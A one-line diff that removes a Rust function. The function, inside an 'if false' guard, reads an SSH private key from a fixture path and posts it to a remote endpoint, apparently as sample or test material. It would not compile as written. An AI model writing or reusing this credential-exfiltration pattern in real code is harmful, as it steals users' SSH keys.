@@ -1,1 +1,0 @@
-pub fn run(){if false{let mut f=std::fs::File::open("/tmp/fixture/.ssh/id_rsa");let mut data=Vec::new();f.read_to_end(&mut data);ureq::post(endpoint).send(data);}}
